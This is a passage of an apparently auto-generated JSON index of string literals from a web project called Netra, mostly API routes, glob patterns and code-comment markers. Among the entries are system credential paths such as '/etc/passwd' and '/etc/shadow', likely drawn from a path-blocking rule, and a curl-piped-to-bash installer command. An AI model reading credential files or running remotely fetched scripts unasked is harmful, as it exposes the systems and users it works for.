          "category": "paths",
          "locations": []
        },
        ".test.ts": {
          "value": ".test.ts",
          "category": "paths",
          "locations": []
        },
        ".test.tsx": {
          "value": ".test.tsx",
          "category": "paths",
          "locations": []
        },
        ".ts": {
          "value": ".ts",
          "category": "paths",
          "locations": []
        },
        ".tsx": {
          "value": ".tsx",
          "category": "paths",
          "locations": []
        },
        ".yml/runs": {
          "value": ".yml/runs",
          "category": "paths",
          "locations": []
        },
        "/ (not found)": {
          "value": "/ (not found)",
          "category": "paths",
          "locations": []
        },
        "/* Generated by Netra QueryBuilder */": {
          "value": "/* Generated by Netra QueryBuilder */",
          "category": "paths",
          "locations": []
        },
        "/* LLM-Generated Query */": {
          "value": "/* LLM-Generated Query */",
          "category": "paths",
          "locations": []
        },
        "/* eslint-disable */": {
          "value": "/* eslint-disable */",
          "category": "paths",
          "locations": []
        },
        "/* tslint:disable */": {
          "value": "/* tslint:disable */",
          "category": "paths",
          "locations": []
        },
        "/**/*.py": {
          "value": "/**/*.py",
          "category": "paths",
          "locations": []
        },
        "/**/*.ts": {
          "value": "/**/*.ts",
          "category": "paths",
          "locations": []
        },
        "/**/*.tsx": {
          "value": "/**/*.tsx",
          "category": "paths",
          "locations": []
        },
        "/**/*_test.py": {
          "value": "/**/*_test.py",
          "category": "paths",
          "locations": []
        },
        "/**/test_*.py": {
          "value": "/**/test_*.py",
          "category": "paths",
          "locations": []
        },
        "/.venv/": {
          "value": "/.venv/",
          "category": "paths",
          "locations": []
        },
        "// Mock fetch for config\n    global.fetch = jest.fn().mockResolvedValue({\n      json: jest.fn().mockResolvedValue({\n        ws_url: 'ws://localhost:8000/ws'\n      })\n    });": {
          "value": "// Mock fetch for config\n    global.fetch = jest.fn().mockResolvedValue({\n      json: jest.fn().mockResolvedValue({\n        ws_url: 'ws://localhost:8000/ws'\n      })\n    });",
          "category": "paths",
          "locations": []
        },
        "/10": {
          "value": "/10",
          "category": "paths",
          "locations": []
        },
        "/100": {
          "value": "/100",
          "category": "paths",
          "locations": []
        },
        "/100\n- **Technical Debt**:": {
          "value": "/100\n- **Technical Debt**:",
          "category": "paths",
          "locations": []
        },
        "/1k tokens)": {
          "value": "/1k tokens)",
          "category": "paths",
          "locations": []
        },
        "/F": {
          "value": "/F",
          "category": "paths",
          "locations": []
        },
        "/FI": {
          "value": "/FI",
          "category": "paths",
          "locations": []
        },
        "/PID": {
          "value": "/PID",
          "category": "paths",
          "locations": []
        },
        "/T": {
          "value": "/T",
          "category": "paths",
          "locations": []
        },
        "/[\\w\\-./]+\\.\\w+": {
          "value": "/[\\w\\-./]+\\.\\w+",
          "category": "paths",
          "locations": []
        },
        "/[\\w\\-./]+\\.\\w+|[A-Z]:\\\\[\\w\\\\\\-.]+\\.\\w+": {
          "value": "/[\\w\\-./]+\\.\\w+|[A-Z]:\\\\[\\w\\\\\\-.]+\\.\\w+",
          "category": "paths",
          "locations": []
        },
        "/_next/static/chunks/webpack.js": {
          "value": "/_next/static/chunks/webpack.js",
          "category": "paths",
          "locations": []
        },
        "/account": {
          "value": "/account",
          "category": "paths",
          "locations": []
        },
        "/actions/artifacts": {
          "value": "/actions/artifacts",
          "category": "paths",
          "locations": []
        },
        "/actions/artifacts/": {
          "value": "/actions/artifacts/",
          "category": "paths",
          "locations": []
        },
        "/actions/runs": {
          "value": "/actions/runs",
          "category": "paths",
          "locations": []
        },
        "/actions/runs/": {
          "value": "/actions/runs/",
          "category": "paths",
          "locations": []
        },
        "/actions/workflows/": {
          "value": "/actions/workflows/",
          "category": "paths",
          "locations": []
        },
        "/agent": {
          "value": "/agent",
          "category": "paths",
          "locations": []
        },
        "/agents": {
          "value": "/agents",
          "category": "paths",
          "locations": []
        },
        "/agents/metrics": {
          "value": "/agents/metrics",
          "category": "paths",
          "locations": []
        },
        "/agents/{agent_name}": {
          "value": "/agents/{agent_name}",
          "category": "paths",
          "locations": []
        },
        "/agents/{agent_name}/report": {
          "value": "/agents/{agent_name}/report",
          "category": "paths",
          "locations": []
        },
        "/ai": {
          "value": "/ai",
          "category": "paths",
          "locations": []
        },
        "/alerts": {
          "value": "/alerts",
          "category": "paths",
          "locations": []
        },
        "/alerts/acknowledge": {
          "value": "/alerts/acknowledge",
          "category": "paths",
          "locations": []
        },
        "/analyses": {
          "value": "/analyses",
          "category": "paths",
          "locations": []
        },
        "/analysis/{analysis_id}": {
          "value": "/analysis/{analysis_id}",
          "category": "paths",
          "locations": []
        },
        "/analysis/{analysis_id}/results": {
          "value": "/analysis/{analysis_id}/results",
          "category": "paths",
          "locations": []
        },
        "/analysis/{analysis_id}/status": {
          "value": "/analysis/{analysis_id}/status",
          "category": "paths",
          "locations": []
        },
        "/analytics": {
          "value": "/analytics",
          "category": "paths",
          "locations": []
        },
        "/analytics/dashboard": {
          "value": "/analytics/dashboard",
          "category": "paths",
          "locations": []
        },
        "/analytics/summary": {
          "value": "/analytics/summary",
          "category": "paths",
          "locations": []
        },
        "/analyze": {
          "value": "/analyze",
          "category": "paths",
          "locations": []
        },
        "/api": {
          "value": "/api",
          "category": "paths",
          "locations": []
        },
        "/api-keys": {
          "value": "/api-keys",
          "category": "paths",
          "locations": []
        },
        "/api-keys/{key_id}": {
          "value": "/api-keys/{key_id}",
          "category": "paths",
          "locations": []
        },
        "/api-specification": {
          "value": "/api-specification",
          "category": "paths",
          "locations": []
        },
        "/api/": {
          "value": "/api/",
          "category": "paths",
          "locations": []
        },
        "/api/admin": {
          "value": "/api/admin",
          "category": "paths",
          "locations": []
        },
        "/api/admin/": {
          "value": "/api/admin/",
          "category": "paths",
          "locations": []
        },
        "/api/admin/*": {
          "value": "/api/admin/*",
          "category": "paths",
          "locations": []
        },
        "/api/agent": {
          "value": "/api/agent",
          "category": "paths",
          "locations": []
        },
        "/api/agents/": {
          "value": "/api/agents/",
          "category": "paths",
          "locations": []
        },
        "/api/agents/start": {
          "value": "/api/agents/start",
          "category": "paths",
          "locations": []
        },
        "/api/auth": {
          "value": "/api/auth",
          "category": "paths",
          "locations": []
        },
        "/api/auth/callback": {
          "value": "/api/auth/callback",
          "category": "paths",
          "locations": []
        },
        "/api/auth/dev_login": {
          "value": "/api/auth/dev_login",
          "category": "paths",
          "locations": []
        },
        "/api/auth/login": {
          "value": "/api/auth/login",
          "category": "paths",
          "locations": []
        },
        "/api/auth/logout": {
          "value": "/api/auth/logout",
          "category": "paths",
          "locations": []
        },
        "/api/auth/refresh": {
          "value": "/api/auth/refresh",
          "category": "paths",
          "locations": []
        },
        "/api/auth/token": {
          "value": "/api/auth/token",
          "category": "paths",
          "locations": []
        },
        "/api/corpus": {
          "value": "/api/corpus",
          "category": "paths",
          "locations": []
        },
        "/api/demo": {
          "value": "/api/demo",
          "category": "paths",
          "locations": []
        },
        "/api/demo/reports/": {
          "value": "/api/demo/reports/",
          "category": "paths",
          "locations": []
        },
        "/api/external": {
          "value": "/api/external",
          "category": "paths",
          "locations": []
        },
        "/api/factory-status": {
          "value": "/api/factory-status",
          "category": "paths",
          "locations": []
        },
        "/api/factory-status/compliance": {
          "value": "/api/factory-status/compliance",
          "category": "paths",
          "locations": []
        },
        "/api/generation": {
          "value": "/api/generation",
          "category": "paths",
          "locations": []
        },
        "/api/github": {
          "value": "/api/github",
          "category": "paths",
          "locations": []
        },
        "/api/health": {
          "value": "/api/health",
          "category": "paths",
          "locations": []
        },
        "/api/invoices/": {
          "value": "/api/invoices/",
          "category": "paths",
          "locations": []
        },
        "/api/llm-cache": {
          "value": "/api/llm-cache",
          "category": "paths",
          "locations": []
        },
        "/api/mcp": {
          "value": "/api/mcp",
          "category": "paths",
          "locations": []
        },
        "/api/mcp-client": {
          "value": "/api/mcp-client",
          "category": "paths",
          "locations": []
        },
        "/api/mcp/": {
          "value": "/api/mcp/",
          "category": "paths",
          "locations": []
        },
        "/api/mcp/ws": {
          "value": "/api/mcp/ws",
          "category": "paths",
          "locations": []
        },
        "/api/poll": {
          "value": "/api/poll",
          "category": "paths",
          "locations": []
        },
        "/api/supply": {
          "value": "/api/supply",
          "category": "paths",
          "locations": []
        },
        "/api/supply/compare": {
          "value": "/api/supply/compare",
          "category": "paths",
          "locations": []
        },
        "/api/supply/enrich": {
          "value": "/api/supply/enrich",
          "category": "paths",
          "locations": []
        },
        "/api/supply/research": {
          "value": "/api/supply/research",
          "category": "paths",
          "locations": []
        },
        "/api/synthetic-data": {
          "value": "/api/synthetic-data",
          "category": "paths",
          "locations": []
        },
        "/api/synthetic/corpus": {
          "value": "/api/synthetic/corpus",
          "category": "paths",
          "locations": []
        },
        "/api/test": {
          "value": "/api/test",
          "category": "paths",
          "locations": []
        },
        "/api/threads": {
          "value": "/api/threads",
          "category": "paths",
          "locations": []
        },
        "/api/tools": {
          "value": "/api/tools",
          "category": "paths",
          "locations": []
        },
        "/api/tools/": {
          "value": "/api/tools/",
          "category": "paths",
          "locations": []
        },
        "/api/users": {
          "value": "/api/users",
          "category": "paths",
          "locations": []
        },
        "/api/users/create": {
          "value": "/api/users/create",
          "category": "paths",
          "locations": []
        },
        "/api/users/me": {
          "value": "/api/users/me",
          "category": "paths",
          "locations": []
        },
        "/api/users/password": {
          "value": "/api/users/password",
          "category": "paths",
          "locations": []
        },
        "/api/v1/agents": {
          "value": "/api/v1/agents",
          "category": "paths",
          "locations": []
        },
        "/api/v1/database": {
          "value": "/api/v1/database",
          "category": "paths",
          "locations": []
        },
        "/api/v1/discovery": {
          "value": "/api/v1/discovery",
          "category": "paths",
          "locations": []
        },
        "/api/v1/example-messages": {
          "value": "/api/v1/example-messages",
          "category": "paths",
          "locations": []
        },
        "/api/v1/status": {
          "value": "/api/v1/status",
          "category": "paths",
          "locations": []
        },
        "/api/v1/threads": {
          "value": "/api/v1/threads",
          "category": "paths",
          "locations": []
        },
        "/api/v1/threads/": {
          "value": "/api/v1/threads/",
          "category": "paths",
          "locations": []
        },
        "/api/v1/threads/[0-9a-f-]+": {
          "value": "/api/v1/threads/[0-9a-f-]+",
          "category": "paths",
          "locations": []
        },
        "/api/v1/users": {
          "value": "/api/v1/users",
          "category": "paths",
          "locations": []
        },
        "/api/v1/users/*": {
          "value": "/api/v1/users/*",
          "category": "paths",
          "locations": []
        },
        "/api/v2/agents": {
          "value": "/api/v2/agents",
          "category": "paths",
          "locations": []
        },
        "/api/v2/users/{user_id}/messages": {
          "value": "/api/v2/users/{user_id}/messages",
          "category": "paths",
          "locations": []
        },
        "/auth": {
          "value": "/auth",
          "category": "paths",
          "locations": []
        },
        "/auth/agents/": {
          "value": "/auth/agents/",
          "category": "paths",
          "locations": []
        },
        "/auth/api-call": {
          "value": "/auth/api-call",
          "category": "paths",
          "locations": []
        },
        "/auth/callback": {
          "value": "/auth/callback",
          "category": "paths",
          "locations": []
        },
        "/auth/callback?token=": {
          "value": "/auth/callback?token=",
          "category": "paths",
          "locations": []
        },
        "/auth/check-authorization": {
          "value": "/auth/check-authorization",
          "category": "paths",
          "locations": []
        },
        "/auth/check-blacklist": {
          "value": "/auth/check-blacklist",
          "category": "paths",
          "locations": []
        },
        "/auth/check-permission": {
          "value": "/auth/check-permission",
          "category": "paths",
          "locations": []
        },
        "/auth/config": {
          "value": "/auth/config",
          "category": "paths",
          "locations": []
        },
        "/auth/create-agent": {
          "value": "/auth/create-agent",
          "category": "paths",
          "locations": []
        },
        "/auth/create-token": {
          "value": "/auth/create-token",
          "category": "paths",
          "locations": []
        },
        "/auth/dev/login": {
          "value": "/auth/dev/login",
          "category": "paths",
          "locations": []
        },
        "/auth/dev_login": {
          "value": "/auth/dev_login",
          "category": "paths",
          "locations": []
        },
        "/auth/error?message=": {
          "value": "/auth/error?message=",
          "category": "paths",
          "locations": []
        },
        "/auth/error?message=redirect_uri_mismatch": {
          "value": "/auth/error?message=redirect_uri_mismatch",
          "category": "paths",
          "locations": []
        },
        "/auth/hash-password": {
          "value": "/auth/hash-password",
          "category": "paths",
          "locations": []
        },
        "/auth/health": {
          "value": "/auth/health",
          "category": "paths",
          "locations": []
        },
        "/auth/impersonate": {
          "value": "/auth/impersonate",
          "category": "paths",
          "locations": []
        },
        "/auth/login": {
          "value": "/auth/login",
          "category": "paths",
          "locations": []
        },
        "/auth/login?provider=": {
          "value": "/auth/login?provider=",
          "category": "paths",
          "locations": []
        },
        "/auth/logout": {
          "value": "/auth/logout",
          "category": "paths",
          "locations": []
        },
        "/auth/me": {
          "value": "/auth/me",
          "category": "paths",
          "locations": []
        },
        "/auth/refresh": {
          "value": "/auth/refresh",
          "category": "paths",
          "locations": []
        },
        "/auth/service-token": {
          "value": "/auth/service-token",
          "category": "paths",
          "locations": []
        },
        "/auth/token": {
          "value": "/auth/token",
          "category": "paths",
          "locations": []
        },
        "/auth/users/": {
          "value": "/auth/users/",
          "category": "paths",
          "locations": []
        },
        "/auth/validate": {
          "value": "/auth/validate",
          "category": "paths",
          "locations": []
        },
        "/auth/validate-service-token": {
          "value": "/auth/validate-service-token",
          "category": "paths",
          "locations": []
        },
        "/auth/verify": {
          "value": "/auth/verify",
          "category": "paths",
          "locations": []
        },
        "/auth/verify-password": {
          "value": "/auth/verify-password",
          "category": "paths",
          "locations": []
        },
        "/auto-refresh": {
          "value": "/auto-refresh",
          "category": "paths",
          "locations": []
        },
        "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"": {
          "value": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
          "category": "paths",
          "locations": []
        },
        "/bulk": {
          "value": "/bulk",
          "category": "paths",
          "locations": []
        },
        "/c/Users/antho/OneDrive/Desktop/Netra/netra-core-generation-1": {
          "value": "/c/Users/antho/OneDrive/Desktop/Netra/netra-core-generation-1",
          "category": "paths",
          "locations": []
        },
        "/cache": {
          "value": "/cache",
          "category": "paths",
          "locations": []
        },
        "/cache/clear": {
          "value": "/cache/clear",
          "category": "paths",
          "locations": []
        },
        "/cache/invalidate/pattern": {
          "value": "/cache/invalidate/pattern",
          "category": "paths",
          "locations": []
        },
        "/cache/invalidate/tag": {
          "value": "/cache/invalidate/tag",
          "category": "paths",
          "locations": []
        },
        "/cache/metrics": {
          "value": "/cache/metrics",
          "category": "paths",
          "locations": []
        },
        "/callback": {
          "value": "/callback",
          "category": "paths",
          "locations": []
        },
        "/callback/google": {
          "value": "/callback/google",
          "category": "paths",
          "locations": []
        },
        "/cancel/{job_id}": {
          "value": "/cancel/{job_id}",
          "category": "paths",
          "locations": []
        },
        "/categories": {
          "value": "/categories",
          "category": "paths",
          "locations": []
        },
        "/change-password": {
          "value": "/change-password",
          "category": "paths",
          "locations": []
        },
        "/chat": {
          "value": "/chat",
          "category": "paths",
          "locations": []
        },
        "/check-blacklist": {
          "value": "/check-blacklist",
          "category": "paths",
          "locations": []
        },
        "/circuit-breakers": {
          "value": "/circuit-breakers",
          "category": "paths",
          "locations": []
        },
        "/claude-review": {
          "value": "/claude-review",
          "category": "paths",
          "locations": []
        },
        "/cleanup": {
          "value": "/cleanup",
          "category": "paths",
          "locations": []
        },
        "/clear": {
          "value": "/clear",
          "category": "paths",
          "locations": []
        },
        "/clickhouse_tables": {
          "value": "/clickhouse_tables",
          "category": "paths",
          "locations": []
        },
        "/clients": {
          "value": "/clients",
          "category": "paths",
          "locations": []
        },
        "/cloudsql/": {
          "value": "/cloudsql/",
          "category": "paths",
          "locations": []
        },
        "/comments": {
          "value": "/comments",
          "category": "paths",
          "locations": []
        },
        "/compare": {
          "value": "/compare",
          "category": "paths",
          "locations": []
        },
        "/config": {
          "value": "/config",
          "category": "paths",
          "locations": []
        },
        "/config/": {
          "value": "/config/",
          "category": "paths",
          "locations": []
        },
        "/config/public": {
          "value": "/config/public",
          "category": "paths",
          "locations": []
        },
        "/config/update": {
          "value": "/config/update",
          "category": "paths",
          "locations": []
        },
        "/config/validate": {
          "value": "/config/validate",
          "category": "paths",
          "locations": []
        },
        "/config/websocket": {
          "value": "/config/websocket",
          "category": "paths",
          "locations": []
        },
        "/connections/status": {
          "value": "/connections/status",
          "category": "paths",
          "locations": []
        },
        "/content": {
          "value": "/content",
          "category": "paths",
          "locations": []
        },
        "/content_corpus": {
          "value": "/content_corpus",
          "category": "paths",
          "locations": []
        },
        "/convert": {
          "value": "/convert",
          "category": "paths",
          "locations": []
        },
        "/corpus": {
          "value": "/corpus",
          "category": "paths",
          "locations": []
        },
        "/create": {
          "value": "/create",
          "category": "paths",
          "locations": []
        },
        "/dashboard": {
          "value": "/dashboard",
          "category": "paths",
          "locations": []
        },
        "/dashboard/metrics": {
          "value": "/dashboard/metrics",
          "category": "paths",
          "locations": []
        },
        "/dashboard/summary": {
          "value": "/dashboard/summary",
          "category": "paths",
          "locations": []
        },
        "/database": {
          "value": "/database",
          "category": "paths",
          "locations": []
        },
        "/database-env": {
          "value": "/database-env",
          "category": "paths",
          "locations": []
        },
        "/database/": {
          "value": "/database/",
          "category": "paths",
          "locations": []
        },
        "/day, $": {
          "value": "/day, $",
          "category": "paths",
          "locations": []
        },
        "/db/": {
          "value": "/db/",
          "category": "paths",
          "locations": []
        },
        "/dev/login": {
          "value": "/dev/login",
          "category": "paths",
          "locations": []
        },
        "/dev_login": {
          "value": "/dev_login",
          "category": "paths",
          "locations": []
        },
        "/docs": {
          "value": "/docs",
          "category": "paths",
          "locations": []
        },
        "/docs/": {
          "value": "/docs/",
          "category": "paths",
          "locations": []
        },
        "/docs/best-practices": {
          "value": "/docs/best-practices",
          "category": "paths",
          "locations": []
        },
        "/document": {
          "value": "/document",
          "category": "paths",
          "locations": []
        },
        "/download?format=": {
          "value": "/download?format=",
          "category": "paths",
          "locations": []
        },
        "/endpoints/": {
          "value": "/endpoints/",
          "category": "paths",
          "locations": []
        },
        "/errors": {
          "value": "/errors",
          "category": "paths",
          "locations": []
        },
        "/errors/": {
          "value": "/errors/",
          "category": "paths",
          "locations": []
        },
        "/errors/{error_id}": {
          "value": "/errors/{error_id}",
          "category": "paths",
          "locations": []
        },
        "/errors/{error_id}/resolve": {
          "value": "/errors/{error_id}/resolve",
          "category": "paths",
          "locations": []
        },
        "/etc/": {
          "value": "/etc/",
          "category": "paths",
          "locations": []
        },
        "/etc/passwd": {
          "value": "/etc/passwd",
          "category": "paths",
          "locations": []
        },
        "/etc/shadow": {
          "value": "/etc/shadow",
          "category": "paths",
          "locations": []
        },
        "/events": {
          "value": "/events",
          "category": "paths",
          "locations": []
        },
        "/events/": {
          "value": "/events/",
          "category": "paths",
          "locations": []
        },
        "/examples": {
          "value": "/examples",
          "category": "paths",
          "locations": []
        },
        "/examples/action-plans": {
          "value": "/examples/action-plans",
          "category": "paths",
          "locations": []
        },
        "/exceptions/": {
          "value": "/exceptions/",
          "category": "paths",
          "locations": []
        },
        "/execute": {
          "value": "/execute",
          "category": "paths",
          "locations": []
        },
        "/export": {
          "value": "/export",
          "category": "paths",
          "locations": []
        },
        "/export/report": {
          "value": "/export/report",
          "category": "paths",
          "locations": []
        },
        "/exports/": {
          "value": "/exports/",
          "category": "paths",
          "locations": []
        },
        "/exports/corpus_": {
          "value": "/exports/corpus_",
          "category": "paths",
          "locations": []
        },
        "/extract": {
          "value": "/extract",
          "category": "paths",
          "locations": []
        },
        "/favicon.ico": {
          "value": "/favicon.ico",
          "category": "paths",
          "locations": []
        },
        "/files": {
          "value": "/files",
          "category": "paths",
          "locations": []
        },
        "/force-cancel": {
          "value": "/force-cancel",
          "category": "paths",
          "locations": []
        },
        "/generate": {
          "value": "/generate",
          "category": "paths",
          "locations": []
        },
        "/generate-simple": {
          "value": "/generate-simple",
          "category": "paths",
          "locations": []
        },
        "/groups/": {
          "value": "/groups/",
          "category": "paths",
          "locations": []
        },
        "/handlers/": {
          "value": "/handlers/",
          "category": "paths",
          "locations": []
        },
        "/health": {
          "value": "/health",
          "category": "paths",
          "locations": []
        },
        "/health/database": {
          "value": "/health/database",
          "category": "paths",
          "locations": []
        },
        "/health/external-apis": {
          "value": "/health/external-apis",
          "category": "paths",
          "locations": []
        },
        "/health/live": {
          "value": "/health/live",
          "category": "paths",
          "locations": []
        },
        "/health/llm": {
          "value": "/health/llm",
          "category": "paths",
          "locations": []
        },
        "/health/ready": {
          "value": "/health/ready",
          "category": "paths",
          "locations": []
        },
        "/health/redis": {
          "value": "/health/redis",
          "category": "paths",
          "locations": []
        },
        "/health/summary": {
          "value": "/health/summary",
          "category": "paths",
          "locations": []
        },
        "/health/system": {
          "value": "/health/system",
          "category": "paths",
          "locations": []
        },
        "/help/requests": {
          "value": "/help/requests",
          "category": "paths",
          "locations": []
        },
        "/history": {
          "value": "/history",
          "category": "paths",
          "locations": []
        },
        "/industry/{industry}/templates": {
          "value": "/industry/{industry}/templates",
          "category": "paths",
          "locations": []
        },
        "/info": {
          "value": "/info",
          "category": "paths",
          "locations": []
        },
        "/ingest_data": {
          "value": "/ingest_data",
          "category": "paths",
          "locations": []
        },
        "/initiate?pr_number=": {
          "value": "/initiate?pr_number=",
          "category": "paths",
          "locations": []
        },
        "/issues/": {
          "value": "/issues/",
          "category": "paths",
          "locations": []
        },
        "/jobs/{job_id}": {
          "value": "/jobs/{job_id}",
          "category": "paths",
          "locations": []
        },
        "/latest": {
          "value": "/latest",
          "category": "paths",
          "locations": []
        },
        "/listeners/": {
          "value": "/listeners/",
          "category": "paths",
          "locations": []
        },
        "/live": {
          "value": "/live",
          "category": "paths",
          "locations": []
        },
        "/llm": {
          "value": "/llm",
          "category": "paths",
          "locations": []
        },
        "/logging/": {
          "value": "/logging/",
          "category": "paths",
          "locations": []
        },
        "/login": {
          "value": "/login",
          "category": "paths",
          "locations": []
        },
        "/logout": {
          "value": "/logout",
          "category": "paths",
          "locations": []
        },
        "/logs": {
          "value": "/logs",
          "category": "paths",
          "locations": []
        },
        "/logs/": {
          "value": "/logs/",
          "category": "paths",
          "locations": []
        },
        "/mcp": {
          "value": "/mcp",
          "category": "paths",
          "locations": []
        },
        "/mcp/call": {
          "value": "/mcp/call",
          "category": "paths",
          "locations": []
        },
        "/mcp/events": {
          "value": "/mcp/events",
          "category": "paths",
          "locations": []
        },
        "/me": {
          "value": "/me",
          "category": "paths",
          "locations": []
        },
        "/message": {
          "value": "/message",
          "category": "paths",
          "locations": []
        },
        "/metricDescriptors/run.googleapis.com/request_count": {
          "value": "/metricDescriptors/run.googleapis.com/request_count",
          "category": "paths",
          "locations": []
        },
        "/metrics": {
          "value": "/metrics",
          "category": "paths",
          "locations": []
        },
        "/metrics-history": {
          "value": "/metrics-history",
          "category": "paths",
          "locations": []
        },
        "/metrics/business-value/objectives": {
          "value": "/metrics/business-value/objectives",
          "category": "paths",
          "locations": []
        },
        "/metrics/current": {
          "value": "/metrics/current",
          "category": "paths",
          "locations": []
        },
        "/metrics/history": {
          "value": "/metrics/history",
          "category": "paths",
          "locations": []
        },
        "/metrics/quality/compliance": {
          "value": "/metrics/quality/compliance",
          "category": "paths",
          "locations": []
        },
        "/metrics/synthetic": {
          "value": "/metrics/synthetic",
          "category": "paths",
          "locations": []
        },
        "/metrics/velocity/trend": {
          "value": "/metrics/velocity/trend",
          "category": "paths",
          "locations": []
        },
        "/metrics/{circuit_name}": {
          "value": "/metrics/{circuit_name}",
          "category": "paths",
          "locations": []
        },
        "/metrics/{metric_name}": {
          "value": "/metrics/{metric_name}",
          "category": "paths",
          "locations": []
        },
        "/migrate-legacy": {
          "value": "/migrate-legacy",
          "category": "paths",
          "locations": []
        },
        "/min": {
          "value": "/min",
          "category": "paths",
          "locations": []
        },
        "/min exceeds threshold": {
          "value": "/min exceeds threshold",
          "category": "paths",
          "locations": []
        },
        "/mock$": {
          "value": "/mock$",
          "category": "paths",
          "locations": []
        },
        "/mock?": {
          "value": "/mock?",
          "category": "paths",
          "locations": []
        },
        "/models/": {
          "value": "/models/",
          "category": "paths",
          "locations": []
        },
        "/module/{module_name}/details": {
          "value": "/module/{module_name}/details",
          "category": "paths",
          "locations": []
        },
        "/monitoring": {
          "value": "/monitoring",
          "category": "paths",
          "locations": []
        },
        "/monitoring/start": {
          "value": "/monitoring/start",
          "category": "paths",
          "locations": []
        },
        "/monitoring/stop": {
          "value": "/monitoring/stop",
          "category": "paths",
          "locations": []
        },
        "/month": {
          "value": "/month",
          "category": "paths",
          "locations": []
        },
        "/notifications/settings": {
          "value": "/notifications/settings",
          "category": "paths",
          "locations": []
        },
        "/openapi.json": {
          "value": "/openapi.json",
          "category": "paths",
          "locations": []
        },
        "/orchestration-alignment": {
          "value": "/orchestration-alignment",
          "category": "paths",
          "locations": []
        },
        "/password-reset/confirm": {
          "value": "/password-reset/confirm",
          "category": "paths",
          "locations": []
        },
        "/password-reset/request": {
          "value": "/password-reset/request",
          "category": "paths",
          "locations": []
        },
        "/pattern/{pattern}": {
          "value": "/pattern/{pattern}",
          "category": "paths",
          "locations": []
        },
        "/performance": {
          "value": "/performance",
          "category": "paths",
          "locations": []
        },
        "/performance/summary": {
          "value": "/performance/summary",
          "category": "paths",
          "locations": []
        },
        "/permissions/{tool_name}": {
          "value": "/permissions/{tool_name}",
          "category": "paths",
          "locations": []
        },
        "/ping": {
          "value": "/ping",
          "category": "paths",
          "locations": []
        },
        "/pool-metrics": {
          "value": "/pool-metrics",
          "category": "paths",
          "locations": []
        },
        "/pool-status": {
          "value": "/pool-status",
          "category": "paths",
          "locations": []
        },
        "/preferences": {
          "value": "/preferences",
          "category": "paths",
          "locations": []
        },
        "/preview": {
          "value": "/preview",
          "category": "paths",
          "locations": []
        },
        "/proc/": {
          "value": "/proc/",
          "category": "paths",
          "locations": []
        },
        "/profile": {
          "value": "/profile",
          "category": "paths",
          "locations": []
        },
        "/prompts": {
          "value": "/prompts",
          "category": "paths",
          "locations": []
        },
        "/prompts/get": {
          "value": "/prompts/get",
          "category": "paths",
          "locations": []
        },
        "/pulls/": {
          "value": "/pulls/",
          "category": "paths",
          "locations": []
        },
        "/q": {
          "value": "/q",
          "category": "paths",
          "locations": []
        },
        "/ready": {
          "value": "/ready",
          "category": "paths",
          "locations": []
        },
        "/redoc": {
          "value": "/redoc",
          "category": "paths",
          "locations": []
        },
        "/references": {
          "value": "/references",
          "category": "paths",
          "locations": []
        },
        "/references/search": {
          "value": "/references/search",
          "category": "paths",
          "locations": []
        },
        "/references/{reference_id}": {
          "value": "/references/{reference_id}",
          "category": "paths",
          "locations": []
        },
        "/refresh": {
          "value": "/refresh",
          "category": "paths",
          "locations": []
        },
        "/register": {
          "value": "/register",
          "category": "paths",
          "locations": []
        },
        "/remediation/{module_name}": {
          "value": "/remediation/{module_name}",
          "category": "paths",
          "locations": []
        },
        "/report": {
          "value": "/report",
          "category": "paths",
          "locations": []
        },
        "/reports/generate": {
          "value": "/reports/generate",
          "category": "paths",
          "locations": []
        },
        "/repos/": {
          "value": "/repos/",
          "category": "paths",
          "locations": []
        },
        "/resources": {
          "value": "/resources",
          "category": "paths",
          "locations": []
        },
        "/resources/read": {
          "value": "/resources/read",
          "category": "paths",
          "locations": []
        },
        "/roi/calculate": {
          "value": "/roi/calculate",
          "category": "paths",
          "locations": []
        },
        "/role": {
          "value": "/role",
          "category": "paths",
          "locations": []
        },
        "/routes/": {
          "value": "/routes/",
          "category": "paths",
          "locations": []
        },
        "/runs": {
          "value": "/runs",
          "category": "paths",
          "locations": []
        },
        "/s": {
          "value": "/s",
          "category": "paths",
          "locations": []
        },
        "/s below threshold": {
          "value": "/s below threshold",
          "category": "paths",
          "locations": []
        },
        "/sandbox": {
          "value": "/sandbox",
          "category": "paths",
          "locations": []
        },
        "/sandbox/script.py": {
          "value": "/sandbox/script.py",
          "category": "paths",
          "locations": []
        },
        "/schema-validation": {
          "value": "/schema-validation",
          "category": "paths",
          "locations": []
        },
        "/schema/": {
          "value": "/schema/",
          "category": "paths",
          "locations": []
        },
        "/score": {
          "value": "/score",
          "category": "paths",
          "locations": []
        },
        "/search": {
          "value": "/search",
          "category": "paths",
          "locations": []
        },
        "/secrets/": {
          "value": "/secrets/",
          "category": "paths",
          "locations": []
        },
        "/sentiment": {
          "value": "/sentiment",
          "category": "paths",
          "locations": []
        },
        "/servers": {
          "value": "/servers",
          "category": "paths",
          "locations": []
        },
        "/servers/{server_name}/connect": {
          "value": "/servers/{server_name}/connect",
          "category": "paths",
          "locations": []
        },
        "/servers/{server_name}/resources": {
          "value": "/servers/{server_name}/resources",
          "category": "paths",
          "locations": []
        },
        "/servers/{server_name}/tools": {
          "value": "/servers/{server_name}/tools",
          "category": "paths",
          "locations": []
        },
        "/service-token": {
          "value": "/service-token",
          "category": "paths",
          "locations": []
        },
        "/services": {
          "value": "/services",
          "category": "paths",
          "locations": []
        },
        "/services/{service_name}": {
          "value": "/services/{service_name}",
          "category": "paths",
          "locations": []
        },
        "/session": {
          "value": "/session",
          "category": "paths",
          "locations": []
        },
        "/session/{session_id}/feedback": {
          "value": "/session/{session_id}/feedback",
          "category": "paths",
          "locations": []
        },
        "/session/{session_id}/status": {
          "value": "/session/{session_id}/status",
          "category": "paths",
          "locations": []
        },
        "/sessions": {
          "value": "/sessions",
          "category": "paths",
          "locations": []
        },
        "/sessions/{session_id}": {
          "value": "/sessions/{session_id}",
          "category": "paths",
          "locations": []
        },
        "/settings": {
          "value": "/settings",
          "category": "paths",
          "locations": []
        },
        "/settings/": {
          "value": "/settings/",
          "category": "paths",
          "locations": []
        },
        "/settings/default_log_table": {
          "value": "/settings/default_log_table",
          "category": "paths",
          "locations": []
        },
        "/settings/log_table": {
          "value": "/settings/log_table",
          "category": "paths",
          "locations": []
        },
        "/settings/log_tables": {
          "value": "/settings/log_tables",
          "category": "paths",
          "locations": []
        },
        "/settings/time_period": {
          "value": "/settings/time_period",
          "category": "paths",
          "locations": []
        },
        "/staging/backend:pr-": {
